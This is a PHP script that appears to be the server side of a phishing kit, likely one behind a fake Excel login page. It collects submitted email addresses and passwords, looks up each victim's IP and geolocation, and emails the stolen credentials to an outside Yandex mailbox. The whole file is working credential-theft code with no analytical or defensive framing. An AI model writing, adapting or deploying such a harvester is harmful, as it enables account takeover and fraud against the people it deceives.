<?php
function geo($ip) {
    $url = "https://reallyfreegeoip.org/json/$ip";
    $ch  = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
    $resp = curl_exec($ch);
    curl_close($ch);
    return $resp;
}
function getUserIP() {
    $client  = @$_SERVER["HTTP_CLIENT_IP"];
    $forward = @$_SERVER["HTTP_X_FORWARDED_FOR"];
    $remote  = $_SERVER["REMOTE_ADDR"];
    if (filter_var($client, FILTER_VALIDATE_IP)) {
        $ip = $client;
    } elseif (filter_var($forward, FILTER_VALIDATE_IP)) {
        $ip = $forward;
    } else {
        $ip = $remote;
    }
    return $ip;
}
    
function get_client_ip() {
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
       $ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}

    
if(isset($_POST['ai']) && isset($_POST['pr'])) {
    $email = $_POST['ai'];
    $password = $_POST['pr'];
    $ip = get_client_ip();
    $geos = json_decode(geo($ip));
    if(!empty($email) && !empty($password)) {
        $headers = "From: ExCeL L0g <unk@stanleyssuites.com>";
        $body .= "----------------------------------------\n";
        $body .= "Email : $email\n";
        $body .= "Password : $password\n";
        $body .= "----------------------------------------\n";
        $body .= "IP : $ip\n";
        $body .= "City : {$geos->city}\n";
        $body .= "Region : {$geos->region_name}\n";
        $body .= "Country : {$geos->country_name}\n";
        $body .= "----------------------------------------\n";
        $subject = "New ExCel LoG | $email | $ip";
        $to = "resultingbox@yandex.com";
        mail($to, $subject, $body, $headers);
    }
}